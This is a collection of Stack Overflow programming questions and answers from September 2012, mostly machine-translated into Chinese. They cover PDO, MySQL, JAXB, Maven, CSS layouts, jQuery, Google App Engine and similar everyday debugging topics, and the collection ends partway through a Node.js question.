> 时间：2012-09-12T16:02:31.183
> 
> 标签：php, pdo

我正在疯狂地寻找以下 PDO SELECT 语句中的错误：

```
$get_allocation_id = "
  SELECT id
  FROM form1_group_info 
  WHERE
   group_name=:group_name, 
   group_leaders=:group_leaders, 
   soas_short_cd=:soas_short_cd, 
   phone_number=:phone_number, 
   email=:email 
  LIMIT 1";
$alloc_id_stmt = $dbh->prepare($get_allocation_id);
$alloc_id_stmt->bindParam(":group_name", $params['group_name']);
$alloc_id_stmt->bindParam(":date_submitted", $params['date_submitted']);
$alloc_id_stmt->bindParam(":group_leaders", $params['group_leaders']);
$alloc_id_stmt->bindParam(":soas_short_cd", $params['soas_short_cd']);
$alloc_id_stmt->bindParam(":phone_number", $params['phone_number']);
$alloc_id_stmt->bindParam(":email", $params['email']);
$alloc_id_stmt->execute(); 
```

上面的代码位于一个 PHP 文件中，该文件由提供 $params 的 ajax 请求调用。

任何建议都非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:03:59.607

如果您包含错误会有所帮助。也就是说，我认为问题在于：

```
$alloc_id_stmt->bindParam(":date_submitted", $params['date_submitted']); 
```

您没有在查询中使用该参数。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-12T16:04:50.853

您的 SQL 语法无效；`WHERE`子句条件必须用逻辑分隔`AND`（或`OR`，但在这种情况下我们假设您的意思是起诉`AND`），但您已用逗号分隔它们：

```
 SELECT id
  FROM form1_group_info 
  WHERE
   group_name=:group_name
   /* Insert logical AND */
   AND group_leaders=:group_leaders 
   AND soas_short_cd=:soas_short_cd 
   AND phone_number=:phone_number
   AND email=:email 
  LIMIT 1; 
```

如上所述，您还绑定了查询中未使用的参数。也许你的意思是：

```
 SELECT id
  FROM form1_group_info 
  WHERE
   group_name=:group_name 
   AND group_leaders=:group_leaders 
   AND soas_short_cd=:soas_short_cd 
   AND phone_number=:phone_number
   AND email=:email
   /* forgot this one... */
   AND date_submitted=:date_submitted
  LIMIT 1; 
```

# asp.net - 将经典 vb 转换为 vb.net

> ID：12392210
> 
> 赞同：0
> 
> 时间：2012-09-12T16:02:37.303
> 
> 标签：asp.net, vb.net

什么是vb中recordset.underlyingvalue和recordset.value的vb.net等价物或类似物？

我正在将一个 vb 应用程序转换为 vb.net，并且我已经用数据集替换了记录集，但我无法弄清楚这一点。任何帮助将非常感激。

我尝试制作数据集的副本并比较值以跟踪更改，但这似乎不是很有效。这是我正在尝试转换的一段代码。

```
For Each fld In rs.Fields
        bfldChanged = False
        Select Case fld.Type
            Case adDate, adDBDate, adDBTime, adDBTimeStamp:                    
                If IsDate(fld.UnderlyingValue) And Not IsDate(fld.Value) Then
                    bfldChanged = True
                ElseIf Not IsDate(fld.UnderlyingValue) And IsDate(fld.Value) Then
                    bfldChanged = True
                ElseIf IsDate(fld.UnderlyingValue) And IsDate(fld.Value) Then
                    If fld.UnderlyingValue <> fld.Value Then
                        bfldChanged = True
                    Else
                        bfldChanged = False
                    End If
                Else
                    bfldChanged = False
                End If
            Case Else:
                If (fld.UnderlyingValue <> fld.Value) Then
                    bfldChanged = True
                Else
                    bfldChanged = False
                End If
        End Select
Next 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:07:20.813

没有与该特定属性等效的东西。.NET 中的数据访问与 VB6 及更早版本中的数据访问非常不同。DataTable 只是***稍微***有点像 RecordSet。

但是，查看代码，您似乎只是在检查表是否包含更改。您可以使用[DataTable.GetChanges()](http://msdn.microsoft.com/en-us/library/k2552649.aspx)方法更简单地确定这一点。

* * *

*不是官方答案的一部分，而是一般建议。*

我已经将大量 VB6 应用程序转换为 .NET 应用程序，经验告诉我，进行逐行转换尝试几乎总是一个坏主意。两者完全不同，在每种情况下，事实证明从头开始更有效且无错误。确保我了解 VB6 应用程序所做的（要求）将其全部映射出来，对所有内容进行流程图，然后从头开始构建 .NET 版本。我除了头痛之外什么都没有。

# c# - 执行我的javascript后页面重新加载，我不希望它

> ID：12392212
> 
> 赞同：1
> 
> 时间：2012-09-12T16:02:39.597
> 
> 标签：c#, javascript, asp.net, sharepoint-2010

执行我的 javascript 时，脚本会正确执行。然而，它产生的共享点通知应该在 3 秒后简单地淡出，而是在大约 2 秒后重新加载整个页面。

**如何在我的脚本执行后防止页面重新加载？**

我的 javascript 中有以下内容`usercontrol.ascx`：

```
 <%@ Control Language="C#" AutoEventWireup="true" CodeBehind="VisualWebPart1UserControl.ascx.cs" Inherits="MoodPanelNy.VisualWebPart1.VisualWebPart1UserControl" %>

        <script type="text/javascript">
            function MyJavascript() {
                // Displays Notification
                var notification = 'Your answer has been submitted, thanks!';
                var notificationId = SP.UI.Notify.addNotification(notification);
            }
        </script> 
```

`Page_Load`这是我将脚本绑定到按钮的方法背后的代码：

```
NotificationButton.Attributes.Add("onclick", "return MyJavascript();");
ScriptManager.RegisterClientScriptBlock(this, this.GetType(), "notification", strScript, true); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:04:42.277

请尝试更新：

```
NotificationButton.Attributes.Add("onclick", "MyJavascript(); return false;");
        ScriptManager.RegisterClientScriptBlock(this, this.GetType(), "notification", strScript, true); 
```

您应该使用`return false;`来防止表单发布。

# mysql - mysql查询扫描所有行

> ID：12392213
> 
> 赞同：0
> 
> 时间：2012-09-12T16:02:41.483
> 
> 标签：mysql, rows, database-scan

伙计们试图围绕 mysql 查询来了解它为什么要扫描表中的所有行

我有 2 个表 topic_entry 和 topic_user

```
CREATE TABLE `topic_entry` (
  `entry_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `topic_id` bigint(20) unsigned NOT NULL,
  `entry_created` datetime NOT NULL,
  `entry_object` text,
  `level` tinyint(4) NOT NULL DEFAULT '3',
  PRIMARY KEY (`entry_id`),
  KEY `entry_created` (`entry_created`),
  KEY `level` (`level`),
  KEY `topic_id_2` (`topic_id`,`entry_id`)
) ENGINE=MyISAM;

CREATE TABLE `topic_user` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `topic_id` bigint(20) unsigned NOT NULL,
  `user_id` varchar(100) NOT NULL,
  `private` enum('y','n') DEFAULT NULL,
  `freq` enum('a','d','w') DEFAULT NULL,
  `topic_id_freq` varchar(10) DEFAULT NULL,
  `casematch` enum('0','1') DEFAULT '0',
  `textmatch` enum('0','1') DEFAULT '0',
  `topic_name_case` varchar(100) DEFAULT '',
  PRIMARY KEY (`id`),
  UNIQUE KEY `topic_id_user_id` (`topic_id`,`user_id`),
  KEY `user_id` (`user_id`),
  KEY `topic_id_freq` (`topic_id_freq`)
) ENGINE=MyISAM; 
```

这是我要运行的查询

```
explain 
select  te.topic_id,te.entry_id 
from topic_entry te 
WHERE te.topic_id in (select topic_id 
                        from topic_user where user_id ='xyz') 
    AND te.level=4 
    AND te.entry_id > 0 
ORDER BY te.entry_id DESC 
LIMIT 5; 
```

解释输出显示它正在扫描所有行

```
|  1 | PRIMARY| te | range  | PRIMARY,level | PRIMARY | 8 | NULL| **722978** | Using where              | 
|  2 | DEPENDENT SUBQUERY | topic_user | unique_subquery | topic_id_user_id,user_id | topic_id_user_id | 310     | func,const |      1 | Using index; Using where | 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:12:11.000

尝试这个：

```
EXPLAIN
SELECT      te.topic_id,te.entry_id 
FROM        topic_entry te 
JOIN        topic_user tu ON te.topic_id = tu.topic_id AND tu.user_id = 'xyz'
WHERE       te.level=4 
AND         te.entry_id > 0 
ORDER BY    te.entry_id DESC 
LIMIT 5; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:12:22.450

尝试更改 WHERE 子句中的键顺序：
`WHERE te.topic_id in (select topic_id from topic_user where user_id ='xyz') AND te.level=4 AND te.entry_id > 0`
我
`WHERE te.topic_id in (select topic_id from topic_user where user_id ='xyz') AND te.entry_id > 0 AND te.level=4`
不是 100% 确定（我目前无法测试它），但它可能会有所帮助。
原因是 MySQL 尝试将您的键映射
`topic_id, level, entry_id`到`KEY topic_id_2`并且由于额外的字段而失败。

PS和“Sly Raskal”有更好的解决方案，或者你可以尝试将两者结合起来

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T16:14:07.817

关于什么

```
explain extended
select  te.topic_id,te.entry_id 
from topic_entry te LEFT JOIN topic_user tu ON
    te.topic_id = tu.topic_id AND tu.user_id = 'xyz'
WHERE 1 = 1
    AND te.level=4 
    AND te.entry_id > 0 
ORDER BY te.entry_id DESC 
LIMIT 5; 
```

# spring-security - Jasig CAS 和 Websphere 的重定向问题

> ID：12392218
> 
> 赞同：1
> 
> 时间：2012-09-12T16:03:02.093
> 
> 标签：spring-security, spring-webflow, cas, websphere-8

我们目前设置了一个负载均衡器来执行 SSL 卸载、一个 http 服务器和一个 websphere 应用程序服务器。克服了卸载的最初障碍，防止 CAS 认为它在 https 下运行（我们通过使用 httpsIndicatorHeader 变量解决了这个问题），我们现在遇到了另一个问题。尽管我们可以看到 CAS 重定向到目标应用程序，但“握手”似乎失败了，显示了一个循环的票证正在生成和尝试，但从未真正验证过，并且从未到达目标应用程序。但是，似乎没有产生任何错误。

有没有人经历过类似的事情？

干杯，

抢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-13T08:40:13.210

经查，问题是websphere中设置的应用重定向url指向的是原来的url，而不是后缀/j_spring_cas_security_check。这导致循环发生而没有任何尝试验证票证。

# github-for-windows - Github for Windows 同步问题

> ID：12392225
> 
> 赞同：6
> 
> 时间：2012-09-12T16:03:27.770
> 
> 标签：github-for-windows

从最新版本的 Github for Windows (1.0.24) 开始，我开始遇到合并和同步存储库的问题。我有一个企业 github 帐户。

这是一个示例情况，我将我的develop分支合并到master中，但是在GFW中查看master分支时没有显示提交。因此同步选项不可用，因为 GFW 认为本地 repo 和服务器上的代码是同步的。

当我查看主分支源代码时，我看到了合并到其中的开发分支的最新提交。GFW 不显示任何提交，除非您使用 Manage branch 选项。在那里你可以看到最新的提交是在 master 分支中。

有什么不正常的，也许是我！

有什么想法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T22:09:22.083

是的，我不时得到完全相同的东西——你没有疯。我希望他们能解决它

# jquery - jquery valdaite 自定义错误消息并恢复为默认值

> ID：12392231
> 
> 赞同：0
> 
> 时间：2012-09-12T16:03:42.400
> 
> 标签：jquery, jquery-validate

我正在尝试设置验证插件，以便：

1.  如果表单字段有一个“必需”类，它将向该字段添加一个类，而不是显示下面的错误消息。如果我们有很多“此字段是必需的”，那么大表格会变得太乱

2.  但是我只希望它以这种方式用于`.required`字段，所有其他验证都应该恢复为默认值。

这是我到目前为止所拥有的：

```
var theForm = $("form[method=post]:not(.noValidate)");
if (theForm.length){
    validater = theForm.validate({
        showErrors: function(errorMap, errorList) {  
            var i, length = errorList.length;
            for (i = 0; i < length; i++) {
                if($(errorList[i].element).hasClass("required")){
                    $(errorList[i].element).addClass("error-required");
                } else {                
                    this.defaultShowErrors();
                }
            }
        }
     });
} 
```

它的一半通过添加`.error-requied`到唯一必填字段来工作，尽管它仍然在每个字段下方显示消息。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T16:39:39.017

我不确定是什么显示了验证错误，例如内置的 html5 浏览器或第三方 javascript 库。如果您使用的是 HTML5 表单，您可以通过在表单标签中使用“novalidate”来禁用表单验证，这反过来会禁用验证标签（应该禁用标签）。

```
<form method="post" novalidate> 
```

如果您使用 html5 并在输入字段上使用“必需”属性，则可以执行以下操作：

```
$('form[method=post]').find('[required]').addClass('error-required'); 
```

否则，您可以使用以下命令找到具有所需类的字段：

```
$('form[method=post]').find('.required').addClass('error-required'); 
```

这仅访问所需的字段并添加类，而不是需要遍历每个表单字段并检查它是否是必需的。

# java - 向某些 3rd 方 Web 应用程序发布登录请求

> ID：12392232
> 
> 赞同：0
> 
> 时间：2012-09-12T16:03:45.160
> 
> 标签：java, ajax, post, login, jsf-1.2

我正在开发用 Java（JSF 1.2）编写的 WebApplication，我需要实现在新浏览器窗口中打开其他第 3 方 WebApplication（在其他域中）的新功能。我需要使用表单 POST 请求登录到这个第 3 方 WebApplication。我的应用程序中的用户应该只看到一个按钮，该按钮应该让他登录到这个第 3 方 Web 应用程序。问题是，我的 Web 应用程序中的用户无法知道他登录到这个第 3 方系统的凭据。

这是我对这个问题的第一个虚拟解决方案：

我添加了一些 JavaScript 和一个按钮：

```
<script type='text/javascript'>
  function login(username, password) {
    var action = "https://some.portal.at.other.domain/login.jsp";
    var data = "";
    data = data + "<form name='loginform' action='" + action + "' method='post'>";
    data = data + "  <input id='username' name='username' type='hidden' value='" + username + "' />";
    data = data + "  <input id='password' name='password' type='hidden' value='" + password + "' />";
    data = data + "</form>";
    data = data + "<sc" + "ript type='text/javascript'>";
    data = data + "  document.loginform.submit();";
    data = data + "</sc" + "ript>";
    newWindow=window.open("", "_blank");
    newWindow.document.write(data);
    newWindow.document.close();
  }
</script>

...

<a4j:commandButton id="Login"
                   value="Login"
                   onclick="login('#{user.login}', '#{user.password}')"/> 
```

这就像一个魅力，但是......当我在浏览器中查看 html 源代码时，我可以看到：

```
<input id="form:Login" name="form:Login" onclick="login('john', 'secret')" value="Login" type="button" /> 
```

因为 JSF 在渲染页面时评估 #{user.login} 和 #{user.password} ，所以安全性被破坏了:)

我的问题是：是否有可能以任何方式保护此功能？

我知道如果有人有像 FireBug 或 WireShark 这样的工具，那么他可以很容易地看到这个 POST 请求，所以我觉得这通常不能得到保护。我想以某种方式确保这一点，它需要更多的努力来打破，而不是仅仅查看页面源。

我认为我应该这样做：在 onclick 上执行一些 ajax 请求，该请求将返回在服务器端生成的这个 JavaScript，然后评估这个 JavaScript，但我不知道该怎么做。

所以请大家给我一些建议谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:11:09.280

保护此类进程的唯一方法是在服务器端执行它。也就是说：如果登录发生在客户端，您*必须*假设客户端对登录中使用的所有凭据具有完全访问权限。

处理这种需要客户端请求但必须首先进行秘密登录的情况的标准方法是让登录发生在服务器端，在用户背后，并返回一个**令牌**客户端可以用来授权他们绝对允许提出的特定请求。

# java - IllegalAnnotationsException：类有两个同名的属性

> ID：12392235
> 
> 赞同：19
> 
> 时间：2012-09-12T16:03:55.680
> 
> 标签：java, xml, web-services, jaxb

我正在尝试使用 RSA 7.5 和 Websphere 7 服务器开发 IBM JAX_WS Web 服务。由于我是初学者，因此我遵循 Java 类优先方法，即我首先创建 Java 类，然后生成 WSDL 文件。

当我尝试创建 wsdl 文件时，出现异常：

**java.security.PrivilegedActionException:com.sun.xml.internal.bind.v2.runtime.IllegalAnnotationsException: 1 计数 IllegalAnnotationsException 类有两个同名的属性“planId”**

我在这里提到的课程看起来像这样：

```
public class MemberDetails{
    @XMLElement(required=true)
    private String planId;
    //public getters and setters for the planId;
} 
```

我不知道为什么会发生这种异常。通过谷歌搜索，我尝试了一些替代方法来解决它，但没有一个对我有用:(

**笔记：**

这是我在整个工作区中使用的唯一注释。我不确定这是否依赖于其他一些注释。但是我尝试了一些，例如@XMLElement(name="Plan",required=true)、@XMLType 等，但每次我都遇到这个异常。

此异常发生在 wsgen 期间。( **java.lang.reflect.InvocationTargetException** )

**编辑**

基本上，当我们从 java 服务方法创建一个 wsdl 并在 SOAP UI 中打开该 WSDL 时，我们就会到达`<!--Optional-->`每个元素的顶部。我想删除此选项标记`<!--Optional-->`标记，因此我正在尝试使用 @XMLElement(required=true) 方法，以便当我在 SOAP UI 中打开 WSDL 时`<!--Optional-->`不会出现强制元素。

根据我的概念，@XMLElement(required=true) 会将 minOccurs 设置为 1，即大于零，因此当我在 SOAP UI 中打开它时，可选注释将从 WSDL 中删除。但不幸的是它不起作用，因此我的概念是不正确的。生成 WSDL 后，我可以看到 minOccurs 仍然为 0。

请解释当我在 SOAP UI 中打开 WSDL 时如何删除可选标记。

问候，

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2012-09-12T17:06:01.680

默认情况下[**，JAXB (JSR-222)**](http://jcp.org/en/jsr/detail?id=222)实现处理公共访问器方法和带注释的字段。如果你注释一个你也有 get/set 方法的字段，你会得到这个异常：

如果要注释字段，则应指定`@XmlAccessorType(XmlAccessType.FIELD)`

```
@XmlAccessorType(XmlAccessType.FIELD)
public class MemberDetails{
    @XMLElement(required=true)
    private String planId;
    //public getters and setters for the planId;
} 
```

或者你可以注释属性

```
public class MemberDetails{

    private String planId;

    @XMLElement(required=true)
    public String getPlanId() {
        return planId;
    }
} 
```

**了解更多信息**

*   [http://blog.bdoughan.com/2011/06/using-jaxbs-xmlaccessortype-to.html](http://blog.bdoughan.com/2011/06/using-jaxbs-xmlaccessortype-to.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-13T20:48:41.430

对于 JAXB2.0，使用`@XmlTransient`on getter 或 setter 进行注释将防止冲突。

在此处查看更多信息：http: [//docs.oracle.com/javase/8/docs/api/javax/xml/bind/annotation/XmlTransient.html](http://docs.oracle.com/javase/8/docs/api/javax/xml/bind/annotation/XmlTransient.html)

# php - 作曲家无法生成 sf2 自动加载文件

> ID：12392243
> 
> 赞同：2
> 
> 时间：2012-09-12T16:04:19.017
> 
> 标签：php, symfony, symfony-2.1, composer-php

要为 Symfony 2.1.0 安装供应商，我正在运行`php composer.phar install`，但它在`Generating autoload files`.

错误是：

> 警告：输入中的意外字符：第 26 行中的 '\' (ASCII=92) state=1
> 
> 脚本 Sensio\Bundle\DistributionBundle\Composer\ScriptHandler::buildBootstrap 处理 post-install-cmd 事件以异常终止

它在本地主机上运行良好，但在服务器上却不行。不确定php设置的问题是什么？

编辑：

PHP 是 5.3.13。我事先检查过。

我运行了 app/check.php，一切正常，除了加速器警告。

我也可以成功安装作曲家。

composer.json 与 2.1 symfony-standard 分支具有相同的值：

```
"extra": {
    "symfony-app-dir": "app",
    "symfony-web-dir": "web"
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-13T14:47:38.267

主机似乎按标准使用 php5.2。叹。

我之前在 .bash_profile 中为 php53 可执行文件创建了一个别名。

这没有通过 ScriptHandler::getPhp 返回，因为它返回了默认的可执行文件 (5.2)。我没有拿起它，因为我已经习惯了 T_FUNCTION 错误被命名空间无法识别。

我可以更改我的 .bash_profile 以使用 PATH 而不是别名。

似乎解决了。

# html - 具有明显问题的 CSS 浮动布局

> ID：12392245
> 
> 赞同：0
> 
> 时间：2012-09-12T16:04:24.983
> 
> 标签：html, css

我对 CSS 完全陌生，而且很困惑，而且或多或少只是对浮动、位置或类似的东西感到沮丧。我会尽力解释

```
DIV1                 DIV2
DIV3 DIV4       

DIV5   DIV6   DIV7   DIV8
DIV9                 
                     DIV10 
```

这就是我正在寻找的布局。我的试验和错误都搞砸了。我有 div1:float:left;div2:float:left div3:clear。到那时一切正常。我想让 div4 在 div3 旁边，然后 5,6,7,8 清除 3 和 4，然后彼此并排。有什么想法吗？我会说它的地狱并在所有事情上做固定的位置，但是试图找出位置也变得令人沮丧。

我在这里添加了我的代码。这已经搞砸了，并且被玩弄了。我有高度和宽度变量不是因为我需要它们，只是为了让事情变得合适而玩耍

```
<style>

#div-1
{
    float:left;
    width:390px;
    height: 170px;

}
#div-2
{
    float:right;
    text-align:right;
    width:450px;
}
#div-3
{
    width:80px;
    height:60px;
    clear:left;
    text-align:left;
}
#div-4
{
    border:dashed 2px;
    float:left;
}
#div-5
{
    float:left;
    top:350px;
}
</style> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:12:58.967

演示：http: [//jsfiddle.net/iambriansreed/uGRWY/](http://jsfiddle.net/iambriansreed/uGRWY/)

HTML：

```
<div class="wrap">
    <div class="DIV1">DIV1</div>
    <div class="DIV2">DIV2</div>
    <div class="DIV3">DIV3</div>
    <div class="DIV4">DIV4</div>
    <div class="DIV5">DIV5</div>
    <div class="DIV6">DIV6</div>
    <div class="DIV7">DIV7</div>
    <div class="DIV8">DIV8</div>
    <div class="DIV9">DIV9</div>
    <div class="DIV10">DIV10</div>
</div>
<pre>
DIV1                 DIV2
DIV3   DIV4
DIV5   DIV6   DIV7   DIV8
DIV9                 
                     DIV10
</pre> 
```

CSS：

```
.wrap {
    position: relative;
    width: 100%;
    overflow: hidden;
    background: #eee;
}
.wrap > div {
    position: relative;
    float: left;
    clear: none;
    background: #ccc;
    width: 25%;
}
.wrap > div.DIV1,
.wrap > div.DIV4 {    
    width: 75%;
}
.wrap > div.DIV9 {    
    width: 100%;
}
.wrap > div.DIV10 {
    float: right;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:15:27.870

这是为您布置的网格，您可以看到我添加浮动/清除的位置： http: [//codepen.io/mastastealth/pen/xyeli](http://codepen.io/mastastealth/pen/xyeli)

HTML：

```
<div class="main">
  <div class="left">1</div>
  <div class="right">2</div>

  <div class="left clear-left">3</div>
  <div class="left">4</div>

  <div class="left clear-left">5</div>
  <div class="left">6</div>
  <div class="left">7</div>
  <div class="left">8</div>

  <div class="left">9</div>
  <div class="right clear-left">10</div>
</div> 
```

CSS：

```
.main { width: 800px; }

.main div { 
  background: #abc123; text-align: center;
  line-height: 50px; width: 200px; 
  box-shadow: inset 0 0 1px #000;
  margin-bottom: 10px;
}

div.left { float: left; }
div.right { float: right; }

div.clear-left { clear: left; } 
```

# html - 将多个 Web 服务器融合到一个站点中

> ID：12392247
> 
> 赞同：0
> 
> 时间：2012-09-12T16:04:27.537
> 
> 标签：html, ajax, web, frames

在我工作的地方，我们使用多种服务，例如 Confluence、JIRA、Bamboo、Mercurial 和其他各种服务，它们都有一个 Web 界面，我们的工程师可以通过公司内部网访问。

然而，我们员工中的许多人并不是直接的网络专家，将这些服务分散开来会使他们感到困惑。我想做的是建立一个中央服务器，他们可以从中分支并找到与他们的工作相关的所有其他 Web 界面。

我的第一个想法是创建一个带有框架的轻型网页，使用顶部栏，用户可以在其中快速导航到任何可用的服务 - 但这会产生一个额外的问题，即我无法通过电子邮件向某人发送直接链接服务中的页面，因为它会删除该框架（当他们看到无法通过点击导航时会再次出现混乱）。

是否有一些最佳实践将这一切放在一起？一些提示？想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:15:46.320

首先，远离框架。他们惹恼了用户一些激烈的事情（部分原因是你刚才提到的那个无法添加书签的问题。）

您可以创建一个可以在弹出窗口中加载的小网页，其中包含指向所有各种工具的下拉导航链接。如果你有资源，你甚至可以让用户自定义这个窗口——这样他们就可以为他们最常用的工具添加书签。

但这确实提出了问题……我猜您的员工不够精明，用户不知道如何使用书签？还是继续访问中央链接存储库页面？无论您想什么解决方案，从您的用户群样本中获取输入，并找出他们实际上更喜欢如何工作。毕竟，他们将使用这些工具。让他们参与进来，征求他们的意见，进行“走廊可用性测试”或您最终构建的任何工具都可能与巧克力茶壶一样有用。

# twitter-bootstrap - Show Specific Tab in Bootstrap

> ID：12392251
> 
> 赞同：0
> 
> 时间：2012-09-12T16:04:32.053
> 
> 标签：twitter-bootstrap

I have the following lack of knowledge on javascript. I have a nav-tab menu with 5 different tabs that can be expanded. But I want when the page loads a spesific tab (based on the previous page or arguments in the url) to be expanded. On the bootstrap page they have the example:
`<script> $(function () { $('#myTab a:last').tab('show'); }) </script>`
My question is that I have no idea what 'a' is and I can't get it to pass an argument so that for instance my second tab to be shown. If I pass integer or #reference instead of 'last' it does not work. Anyone knows what is the right syntax here?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T19:33:44.070

`#myTab a:last` is a jQuery selector that means *"the last `<a>` tag contained in the element with id `#myTab`"*. So that function runs the `show` method on the element that matches that selector.

If you want to select a different element, you can use any jQuery selector. There are lots of them: CSS standard selectors plus [these ones](http://api.jquery.com/category/selectors/).

For your specific issue, you can select the second tab by passing its `#id` or by using `:nth-child(2)` (wich means *"the elements that are a second child"*).

# google-maps-api-3 - 如何获取圆半径内的标记？

> ID：12392253
> 
> 赞同：2
> 
> 时间：2012-09-12T16:04:38.427
> 
> 标签：google-maps-api-3

我有一张已经包含标记的地图。我希望能够在指定位置周围指定一个圆半径并选择驻留在其中的所有标记。

添加圆的代码就完成了。我需要知道如何获得标记。

谁能帮忙...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T19:27:38.543

[假设您在数组中有标记，那么您可以使用computeDistanceBetween 函数](https://developers.google.com/maps/documentation/javascript/reference#spherical)计算从每个标记到圆心的距离，并仅将其添加到第二个数组中`distance <= radius`。

# google-app-engine - NDB、自我和 IntegerProperty

> ID：12392255
> 
> 赞同：0
> 
> 时间：2012-09-12T16:04:45.203
> 
> 标签：google-app-engine, google-cloud-datastore

这是可笑的微不足道，但我花了半个小时试图解决它。

```
class SocialPost(model.Model):
  total_comments=model.IntegerProperty(default=0)

def create_reply_comment(self,content,author):
    ...
    logging.info(self)
    self.total_comments=self.total_comments+1
    self.put() 
```

在日志文件中，我可以看到 total_comments 是 0，但在管理控制台中，它是 1。其他字段是正确的，除了这个。

可能那个“default = 0”有问题，但我找不到问题所在。

编辑：我的功能的完整代码

def create_reply_comment(self,content,author): floodControl=memcache.get("FloodControl-"+str(author.key)) if floodControl: raise base.FloodControlException

```
 new_comment= SocialComment(parent=self.key)
    new_comment.author=author.key
    new_comment.content=content
    new_comment.put()

    logging.info(self)
    self.latest_comment_date=new_comment.creation_date
    self.latest_comment=new_comment.key
    self.total_comments=self.total_comments+1
    self.put()
    memcache.add("FloodControl-"+str(author.key), datetime.now(),time=SOCIAL_FLOOD_TIME) 
```

我在哪里调用函数：

```
if cmd == "create_reply_post":
           post=memcache.get("SocialPost-"+str(self.request.get('post')))
           if post is None:
              post=model.Key(urlsafe=self.request.get('post')).get()
              memcache.add("SocialPost-"+str(self.request.get('post')),post)
           node=node.get()
           if not node.get_subscription(user).can_reply:
               self.success()
               return

           post.create_reply_comment(feedparser._sanitizeHTML(self.request.get("content"),"UTF-8"),user) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T20:13:29.633

您在更改total_comments 之前调用了memcache.add，因此当您在后续调用中从memcache 中读取它时，您会从缓存中获得一个过时的值。您的 create_reply_comment 需要删除或覆盖`"SocialPost-"+str(self.request.get('post')`缓存键。

[编辑] 虽然你的帖子标题说你正在使用 NDB（model.Model 虽然？嗯。），所以你可以完全跳过 memcache 位，让 NDB 做这件事？

# java - 为什么我的 Maven 插件不在构建生命周期中运行？

> ID：12392260
> 
> 赞同：16
> 
> 时间：2012-09-12T16:04:57.037
> 
> 标签：java, maven, configuration, pom.xml

我尝试使用以下 pom 部分为我的 Maven 生命周期添加一个目标。我定义了一个新插件并使用阶段和执行信息对其进行配置。

```
<build>
    <pluginManagement>
        <plugins>                   
            <plugin>
                <groupId>org.apache.openjpa</groupId>
                <artifactId>openjpa-maven-plugin</artifactId>
                <version>2.2.0</version>
                <configuration>
                <includes>**/entity/*.class</includes>
               <addDefaultConstructor>true</addDefaultConstructor>
               <connectionDriverName>com.ibm.db2.jcc.DB2Driver</connectionDriverName>
                        <enforcePropertyRestrictions>true</enforcePropertyRestrictions>
                        <sqlFile>${project.build.directory}/database.sql</sqlFile>
                    </configuration>
                    <executions>
                        <execution>
                            <id>sql</id>
                            <phase>generate-resources</phase>
                            <goals>
                                <goal>sql</goal>
                            </goals>
                        </execution>
                        <execution>
                            <id>enhancer</id>
                            <phase>process-classes</phase>
                            <goals>
                                <goal>enhance</goal>
                            </goals>
                        </execution>
                    </executions>
                    <dependencies>
                        <dependency>
                            <groupId>org.apache.openjpa</groupId>
                            <artifactId>openjpa</artifactId>

                            <version>2.1.1</version>
                        </dependency>
                    </dependencies>
                </plugin>
            </plugins>
        </pluginManagement>
    </build> 
```

然后我用 maven 运行`mvn:install`但是插件没有运行？

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-09-12T16:26:01.657

确保该插件存在依赖关系并且该插件`build/plugin`不在`build/pluginmanagement/plugin`.

尝试这样的事情：

```
<dependencies>
    <dependency>
        <groupId>org.apache.openjpa</groupId>
        <artifactId>openjpa</artifactId>
        <version>2.1.1</version>
    </dependency>
</dependencies>

<build>
    <pluginManagement>
        <plugins>                   
            <plugin>
                <groupId>org.apache.openjpa</groupId>
                <artifactId>openjpa-maven-plugin</artifactId>
                <version>2.2.0</version>
                <configuration>
                    <includes>**/entity/*.class</includes>
                    <addDefaultConstructor>true</addDefaultConstructor>
                    <connectionDriverName>com.ibm.db2.jcc.DB2Driver</connectionDriverName>
                    <enforcePropertyRestrictions>true</enforcePropertyRestrictions>
                    <sqlFile>${project.build.directory}/database.sql</sqlFile>
                </configuration>
            </plugin>
        </plugins>
    </pluginManagement>

    <plugins>
        <plugin>
            <groupId>org.apache.openjpa</groupId>
            <artifactId>openjpa-maven-plugin</artifactId>
            <executions>
                <execution>
                    <id>sql</id>
                    <phase>generate-resources</phase>
                    <goals>
                        <goal>sql</goal>
                    </goals>
                </execution>
                <execution>
                    <id>enhancer</id>
                    <phase>process-classes</phase>
                    <goals>
                        <goal>enhance</goal>
                    </goals>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build> 
```

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2012-09-17T13:58:49.913

`pluginManagement`应该配置插件，在命令行调用。

如果您想将插件绑定到某个执行阶段 - 只需将其移至 pom.xml 的 build->plugins 部分

# node.js - node.js - 与 php 的区别

> ID：12392261
> 
> 赞同：0
> 
> 时间：2012-09-12T16:04:59.250
> 
> 标签：node.js

我在 PHP 中有以下代码：

```
$IDs = implode(",", array_keys($result["matches"]));
$sql = "SELECT * FROM table WHERE id IN ($IDs)"; 
```

我正在将它“翻译”成 Node.js，我想 implode 变成了 array.join，所以我尝试了这个：

```
